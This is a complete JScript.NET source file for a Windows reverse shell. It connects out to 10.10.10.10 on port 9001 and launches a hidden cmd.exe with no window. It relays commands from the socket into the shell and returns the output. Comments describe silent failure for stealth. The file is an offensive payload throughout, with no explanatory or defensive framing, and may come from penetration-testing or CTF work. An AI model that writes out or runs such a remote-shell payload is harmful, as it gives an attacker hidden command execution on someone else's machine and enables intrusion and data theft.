import System;
import System.Net;
import System.Net.Sockets;
import System.Text;
import System.Diagnostics;
import System.IO;

var HOST : String = "10.10.10.10";
var PORT : int = 9001;

try {
    var client : TcpClient = new TcpClient();
    client.Connect(HOST, PORT);
    
    Console.Error.WriteLine("[*] Connected to " + HOST + ":" + PORT);
    
    var stream : NetworkStream = client.GetStream();
    var reader : StreamReader = new StreamReader(stream);
    var writer : StreamWriter = new StreamWriter(stream);
    writer.AutoFlush = true;

    // Start hidden cmd.exe with redirected I/O
    var psi : ProcessStartInfo = new ProcessStartInfo();
    psi.FileName = "cmd.exe";
    psi.Arguments = "";
    psi.UseShellExecute = false;
    psi.RedirectStandardInput = true;
    psi.RedirectStandardOutput = true;
    psi.RedirectStandardError = true;
    psi.CreateNoWindow = true;
    psi.WindowStyle = ProcessWindowStyle.Hidden;

    var shell : Process = new Process();
    shell.StartInfo = psi;
    shell.Start();

    // Forward cmd.exe output to socket (stdout + stderr)
    function ReadOutput() {
        while (true) {
            if (shell.StandardOutput.Peek() > -1) {
                var output : String = shell.StandardOutput.ReadLine();
                if (output) writer.WriteLine(output);
            }
            if (shell.StandardError.Peek() > -1) {
                var err : String = shell.StandardError.ReadLine();
                if (err) writer.WriteLine(err);
            }
            if (!shell.HasExited) {
                System.Threading.Thread.Sleep(10);
            } else {
                break;
            }
        }
    }

    // Start a thread-like loop for reading output (JScript.NET doesn't have easy threads)
    // For simplicity we use a busy loop with small sleep
    var outputThread = function() {
        while (!shell.HasExited) {
            ReadOutput();
        }
    };

    // Main loop: read from socket and send to cmd.exe stdin
    while (!shell.HasExited) {
        if (stream.DataAvailable) {
            var data : String = reader.ReadLine();
            if (data) {
                shell.StandardInput.WriteLine(data);
            }
        }
        // Also forward any pending output
        if (shell.StandardOutput.Peek() > -1 || shell.StandardError.Peek() > -1) {
            ReadOutput();
        }
        System.Threading.Thread.Sleep(50);
    }

    writer.WriteLine("[*] Shell exited.");
    client.Close();

} catch (e) {
    // Silent fail / stealth
    try { 
        if (client) client.Close(); 
    } catch (ex) {}
    // WScript.Quit(1);   // uncomment if you run via wscript/cscript
}
